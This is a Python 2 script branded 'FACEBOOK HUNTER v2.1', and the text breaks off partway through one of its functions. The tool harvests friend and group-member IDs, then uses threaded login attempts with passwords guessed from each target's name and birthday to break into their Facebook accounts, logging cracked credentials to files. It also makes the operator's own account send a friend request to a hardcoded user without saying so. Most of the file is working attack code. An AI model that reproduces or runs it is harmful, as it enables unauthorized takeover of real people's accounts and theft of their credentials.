# Created by W1nz0N
# Credits to ZeDD Parker
# Special Thanks to:
#	Aikhen, Romel, Pirates_Men, Ely & PHFF TEAM

import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
from multiprocessing.pool import ThreadPool

try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
else:
    try:
        import requests
    except ImportError:
        os.system('pip2 install requests')

from requests.exceptions import ConnectionError
from mechanize import Browser
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

def Exit():
    print '    \x1b[1;91m	[!] Exit'
    os.sys.exit()


def winzon(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)


logo = """
       \x1b[1;92m+=======================================+
       |         [\x1b[1;93mFACEBOOK HUNTER v2.1\x1b[1;92m]        |
       |---------------------------------------|
       |            \033[31;1mAuthor \x1b[1;37;40m: \x1b[1;92mW1nz0N\x1b[1;92m            |
       |           \033[31;1mCredits \x1b[1;37;40m: \x1b[1;92mZeDD Parker\x1b[1;92m       | 
       |      \033[31;1mDate Release \x1b[1;37;40m: \x1b[1;92mJune 24, 2019\x1b[1;92m     |
       |                                       |
       |              [PHFF TEAM]\x1b[1;92m              |
       |     \033[0mGoodluck and Enjoy Hacking!!!\x1b[1;92m     |
       |=======================================|
       |  [\x1b[1;93mGithub: https://github.com/W1nz0N\x1b[1;92m]  |
       +---------------------------------------+
"""


def tik():
    titik = [
     '.   ', '..  ', '... ']
    for o in titik:
        print '    \r\x1b[1;91m	[\xe2\x97\x8f] \x1b[1;92mConnecting \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)


back = 0
threads = []
Succeeded = []
cekpoint = []
Failed = []
idteman = []
idfromteman = []
idmem = []
id = []
idx = []
id1 = []
id2 = []
id3 = []
id4 = []
id5 = []
ida = []
idb = []
idc = []
idd = []
ide = []
em = []
emfromteman = []
hp = []
hpfromteman = []
reaksi = []
reaksigrup = []
komen = []
komengrup = []
listgrup = []
vulnot = '\x1b[31mNot Vuln'
vuln = '\x1b[32mVuln'
oksave = open('Hacklist.txt', 'w')
cpsave = open('Checkpoint.txt', 'w')


def login():
    os.system('clear')
    try:
        toket = open('login.txt', 'r')
        menu()
    except (KeyError, IOError):
        os.system('clear')
        print logo
        print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'
        print '    \x1b[1;91m	[\xe2\x98\x86] \x1b[1;92mLOGIN FACEBOOK ACCOUNT\x1b[1;91m [\xe2\x98\x86]'
        idx = raw_input('    \x1b[1;91m	[+] \x1b[1;36mUsername \x1b[1;91m:\x1b[1;92m ')
        pwd = getpass.getpass('    \x1b[1;91m	[+] \x1b[1;36mPassword \x1b[1;91m: \x1b[1;92m')
        tik()
        try:
            br.open('https://m.facebook.com')
        except mechanize.URLError:
            print '\n\x1b[1;91m        [!] There is No Connection'
            Exit()

        br._factory.is_html = True
        br.select_form(nr=0)
        br.form['email'] = idx
        br.form['pass'] = pwd
        br.submit()
        url = br.geturl()
        if 'save-device' in url:
            try:
                sig = 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail=' + idx + 'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword=' + pwd + 'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
                data = {'api_key': '882a8490361da98702bf97a021ddc14d', 'credentials_type': 'password', 'email': idx, 'format': 'JSON', 'generate_machine_id': '1', 'generate_session_cookies': '1', 'locale': 'en_US', 'method': 'auth.login', 'password': pwd, 'return_ssl_resources': '0', 'v': '1.0'}
                x = hashlib.new('md5')
                x.update(sig)
                a = x.hexdigest()
                data.update({'sig': a})
                url = 'https://api.facebook.com/restserver.php'
                r = requests.get(url, params=data)
                z = json.loads(r.text)
                winz = open('login.txt', 'w')
                winz.write(z['access_token'])
                winz.close()
                print '\n\x1b[1;91m	[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin Successfully'
                requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
                time.sleep(2)
                menu()
            except requests.exceptions.ConnectionError:
                print '\n\x1b[1;91m        [!] There is No Connection'
                Exit()

        if 'checkpoint' in url:
            print '\n\x1b[1;91m        [!] \x1b[1;93mAccount Hit by Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(1)
            Exit()
        else:
            print '\n\x1b[1;91m	[!] Login Failed! Invalid Username/Password'
            os.system('rm -rf login.txt')
            time.sleep(3)
            login()


def menu():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        os.system('clear')
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()
    else:
        try:
            otw = requests.get('https://graph.facebook.com/me?access_token=' + toket)
            a = json.loads(otw.text)
            name = a['name']
            id = a['id']
            ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
            b = json.loads(ots.text)
            sub = str(b['summary']['total_count'])
        except KeyError:
            os.system('clear')
            print logo
            print '    \x1b[1;91m    [!] \x1b[1;93mSeems Like Account Hit by Checkpoint'
            os.system('rm -rf login.txt')
            time.sleep(3)
            login()
        except requests.exceptions.ConnectionError:
            print '\x1b[1;91m        [!] There is No Connection'
            Exit()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Name \x1b[1;91m: \x1b[1;92m' + name + (27 - len(name)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m FBID \x1b[1;91m: \x1b[1;92m' + id + (27 - len(id)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\xe2\x95\x91\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m]\x1b[1;97m Subs \x1b[1;91m: \x1b[1;92m' + sub + (27 - len(sub)) * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Auto Hunting   '
    print '    \x1b[1;37;40m	[2] Manual Hunting '
    print '    \x1b[1;37;40m	[3] Yahoo Checker  '
    print '    \x1b[1;37;40m	[4] View Saved File'
    print '    \x1b[1;37;40m	[5] Update         '
    print '    \x1b[1;37;40m	[6] Logout         '
    print '    \x1b[1;31;40m	[0] Exit           '
    print
    menulist()


def menulist():
    winz = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if winz == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        menulist()
    else:
        if winz == '1':
            autohack()
        else:
            if winz == '2':
                manhack()
            else:
                if winz == '3':
                    yahoocheck()
                else:
                    if winz == '4':
                        filemenu()
                    else:
                        if winz == '5':
                            os.system('clear')
                            print logo
                            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                            print '	\xe2\x95\x91' + '\x1b[1;91m\x1b[1;96m		 UPDATE' + 16 * '\x1b[1;97m ' + '\xe2\x95\x91'
                            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                            os.system('git pull origin master')
                            raw_input('\n\x1b[1;91m	[\x1b[1;97mBack\x1b[1;91m]')
                            menu()
                        else:
                            if winz == '6':
                                os.system('rm -rf login.txt')
                                Exit()
                            else:
                                if winz == '0':
                                    Exit()
                                else:
                                    print '    \x1b[1;91m    [\xe2\x9c\x96] \x1b[1;97m' + winz + ' \x1b[1;91mis Invalid!'
                                    menulist()

def filemenu():
    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91' + '\x1b[1;91m\x1b[1;96m	      SAVED FILE LIST' + 10 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Yahoomails   '
    print '    \x1b[1;37;40m	[2] Hack Lists   '
    print '    \x1b[1;37;40m	[3] Checkpoints  '
    print '    \x1b[1;31;40m	[0] Back         '
    print
    filelist()


def filelist():
    hack = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        filelist()
    else:
        if hack == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91' + '\x1b[1;91m\x1b[1;96m	VULNERABLE YAHOO ACCOUNTS' + 6 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            os.system('cat Vulnerable.txt')
            raw_input('\n\x1b[1;91m	[\x1b[1;97mBack\x1b[1;91m]')
            filemenu()
        else:
            if hack == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91' + '\x1b[1;91m\x1b[1;96m	      HACKED ACCOUNTS' + 10 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                os.system('cat Hacklist.txt')
                raw_input('\n\x1b[1;91m	[\x1b[1;97mBack\x1b[1;91m]')
                filemenu()
            else:
                if hack == '3':
                    os.system('clear')
                    print logo
                    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                    print '	\xe2\x95\x91' + '\x1b[1;91m\x1b[1;96m	    CHECKPOINT ACCOUNTS' + 8 * '\x1b[1;97m ' + '\xe2\x95\x91'
                    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                    os.system('cat Checkpoint.txt')
                    raw_input('\n\x1b[1;91m	[\x1b[1;97mBack\x1b[1;91m]')
                    filemenu()
                else:
                    if hack == '0':
                        menu()
                    else:
                        print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mis Invalid!'
                        filelist()

def autohack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	     AUTOMATIC HACKING' + 9 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Brute Forcing    '
    print '    \x1b[1;37;40m	[2] Hack via Name    '
    print '    \x1b[1;37;40m	[3] Hack via Phone # '
    print '    \x1b[1;37;40m	[4] Hack via Birthday'
    print '    \x1b[1;31;40m	[0] Back             '
    print
    autolist()

def autolist():
    hack = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        autolist()
    else:
        if hack == '1':
            brute()
        else:
            if hack == '2':
                hackname()
            else:
                if hack == '3':
                    hackphone()
                else:
                    if hack == '4':
                        hackbday()
                    else:
                        if hack == '0':
                            menu()
                        else:
                            print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mis Invalid!'
                            autolist()

def manhack():
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      MANUAL HACKING' + 11 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Free Hunting         '
    print '    \x1b[1;37;40m	[2] Add After FirstName  '
    print '    \x1b[1;37;40m	[3] Add After LastName   '
    print '    \x1b[1;37;40m	[4] Add Before FirstName '
    print '    \x1b[1;37;40m	[5] Add Before LastName  '
    print '    \x1b[1;31;40m	[0] Back                 '
    print
    manlist()

def manlist():
    hack = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if hack == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        manlist()
    else:
        if hack == '1':
            freehunt()
        else:
            if hack == '2':
                afname()
            else:
                if hack == '3':
                    alname()
                else:
                    if hack == '4':
                        bfname()
                    else:
                        if hack == '5':
                            blname()
                        else:
                            if hack == '0':
                                menu()
                            else:
                                print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + hack + ' \x1b[1;91mis Invalid!'
                                manlist()

def brute():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      BRUTE FORCING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    bruteforce()

def bruteforce():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        bruteforce()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      BRUTE FORCING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            winzon('	\x1b[1;91m[+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id1.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      BRUTE FORCING' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                idg = raw_input('	\x1b[1;91m[+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '	\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '\x1b[1;91m	[!] Group Not Found'
                    raw_input('	\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    brute()
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id1.append(i['id'])
            else:
                if peak == '0':
                    autohack()
                else:
                    print '	\x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    brutefoce()
    print '	\x1b[1;91m[+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(id1))
    winzon('    \x1b[1;91m	[\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '	\r\r\x1b[1;91m	[\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            nem = ' [' + b['name'] + ']'
            pass1 = b['first_name'] + '123'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + pass1 + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + pass1 + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['first_name'] + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + pass2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + pass2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['last_name'] + '123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
                                oksave.write(user + ' | ' + pass3 + nem + '\n')
                                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass3
                            else:
                                if 'www.facebook.com' in q['error_msg']:
                                    cpsave.write(user + ' | ' + pass3 + nem + '\n')
                                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass3
                                else:
                                    lahir = b['birthday']
                                    pass4 = lahir.replace('/', '')
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    q = json.load(data)
                                    if 'access_token' in q:
                                        oksave.write(user + ' | ' + pass4 + nem + '\n')
                                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass4
                                    else:
                                        if 'www.facebook.com' in q['error_msg']:
                                            cpsave.write(user + ' | ' + pass4 + nem  + '\n')
                                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass4
                                        else:
                                            pass5 = b['first_name'] + '1234'
                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                            q = json.load(data)
                                            if 'access_token' in q:
                                                oksave.write(user + ' | ' + pass5 + nem + '\n')
                                                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass5
                                            else:
                                                if 'www.facebook.com' in q['error_msg']:
                                                     cpsave.write(user + ' | ' + pass5 + nem + '\n')
                                                     print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass5
                                                else:
                                                    fnem = b['first_name']
                                                    bday = b['birthday']
                                                    rep = bday.replace('/', '')
                                                    con = 'rep'
                                                    omit = con[-4:]
                                                    pass6 = 'fnem' + 'omit'
                                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                    q = json.load(data)
                                                    if 'access_token' in q:
                                                        oksave.write(user + ' | ' + pass6 + nem + '\n')
                                                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass6
                                                    else:
                                                        if 'www.facebook.com' in q['error_msg']:
                                                            cpsave.write(user + ' | ' + pass6 + nem + '\n')
                                                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass6
                                                        else:
                                                            lnem = b['last_name']
                                                            bday = b['birthday']
                                                            rep = bday.replace('/', '')
                                                            con = 'rep'
                                                            omit = con[-4:]
                                                            pass7 = 'lnem' + 'omit'
                                                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                                            q = json.load(data)
                                                            if 'access_token' in q:
                                                                oksave.write(user + ' | ' + pass7 + nem + '\n')
                                                                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass7
                                                            else:
                                                                if 'www.facebook.com' in q['error_msg']:
                                                                    cpsave.write(user + ' | ' + pass7 + nem + '\n')
                                                                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass7
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id1)
    oksave.close()
    cpsave.close()
    print '\n\x1b[1;91m        [+] \x1b[1;97mFinished'
    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
    brute()

def hackname():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '    \x1b[1;91m[!] Token Not Found'
        os.system('rm -rf login.txt')
        time.sleep(1)
        login()

    os.system('clear')
    print logo
    print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
    print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      HACK VIA NAME' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
    print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
    print '    \x1b[1;37;40m	[1] Crack from the Friend List'
    print '    \x1b[1;37;40m	[2] Crack from Group Members'
    print '    \x1b[1;31;40m	[0] Back'
    print
    hacknamelist()

def hacknamelist():
    peak = raw_input('    \x1b[1;91m	-\xe2\x96\xba\x1b[1;97m ')
    if peak == '':
        print '    \x1b[1;91m    [!] Command Not Found'
        hacknamelist()
    else:
        if peak == '1':
            os.system('clear')
            print logo
            print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
            print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      HACK VIA NAME' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
            print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
            winzon('    \x1b[1;91m    [+] \x1b[1;92mGathering Friends ID\x1b[1;97m...')
            r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
            z = json.loads(r.text)
            for s in z['data']:
                id2.append(s['id'])

        else:
            if peak == '2':
                os.system('clear')
                print logo
                print '	\x1b[1;97m\xe2\x95\x94' + 38 * '\xe2\x95\x90' + '\xe2\x95\x97'
                print '	\xe2\x95\x91\x1b[1;91m\x1b[1;96m	      HACK VIA NAME' + 12 * '\x1b[1;97m ' + '\xe2\x95\x91'
                print '	\x1b[1;97m\xe2\x95\x9a' + 38 * '\xe2\x95\x90' + '\xe2\x95\x9d'
                idg = raw_input('    \x1b[1;91m    [+] \x1b[1;92mGroup ID   \x1b[1;91m:\x1b[1;97m ')
                try:
                    r = requests.get('https://graph.facebook.com/group/?id=' + idg + '&access_token=' + toket)
                    asw = json.loads(r.text)
                    print '    \x1b[1;91m    [\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mGroup Name \x1b[1;91m:\x1b[1;97m ' + asw['name']
                except KeyError:
                    print '    \x1b[1;91m    [!] Group Not Found'
                    raw_input('\n\x1b[1;91m        [\x1b[1;97mBack\x1b[1;91m]')
                    hackname()
                re = requests.get('https://graph.facebook.com/' + idg + '/members?fields=name,id&limit=999999999&access_token=' + toket)
                s = json.loads(re.text)
                for i in s['data']:
                    id2.append(i['id'])
            else:
                if peak == '0':
                    autohack()
                else:
                    print '    \x1b[1;91m	[\xe2\x9c\x96] \x1b[1;97m' + peak + ' \x1b[1;91mis Invalid!'
                    hacknamelist()
    print '    \x1b[1;91m    [+] \x1b[1;92mGathered IDs \x1b[1;91m: \x1b[1;97m' + str(len(id2))
    winzon('    \x1b[1;91m    [\xe2\x9c\xba]\x1b[1;92m Wait a minute \x1b[1;97m...')
    titik = ['.   ', '..  ', '... ']
    for o in titik:
        print '    \r\r\x1b[1;91m        [\x1b[1;96m\xe2\x9c\xb8\x1b[1;91m] \x1b[1;92mCracking \x1b[1;97m' + o,
        sys.stdout.flush()
        time.sleep(1)

    print
    print '	\x1b[1;97m\xe2\x95\x90' + 38 * '\xe2\x95\x90'

    def main(arg):
        user = arg
        try:
            a = requests.get('https://graph.facebook.com/' + user + '/?access_token=' + toket)
            b = json.loads(a.text)
            nem = ' [' + b['name'] + ']'
            pass1 = b['first_name']
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            q = json.load(data)
            if 'access_token' in q:
                oksave.write(user + ' | ' + pass1 + nem + '\n')
                print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass1
            else:
                if 'www.facebook.com' in q['error_msg']:
                    cpsave.write(user + ' | ' + pass1 + nem + '\n')
                    print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass1
                else:
                    pass2 = b['last_name']
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    q = json.load(data)
                    if 'access_token' in q:
                        oksave.write(user + ' | ' + pass2 + nem + '\n')
                        print '    \x1b[1;97m    [\x1b[1;92mOK\xe2\x9c\x93\x1b[1;97m] ' + user + ' | ' + pass2
                    else:
                        if 'www.facebook.com' in q['error_msg']:
                            cpsave.write(user + ' | ' + pass2 + nem + '\n')
                            print '    \x1b[1;97m    [\x1b[1;93mCP\xe2\x9c\x9a\x1b[1;97m] ' + user + ' | ' + pass2
                        else:
                            pass3 = b['first_name'] + b['last_name']
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            q = json.load(data)
                            if 'access_token' in q:
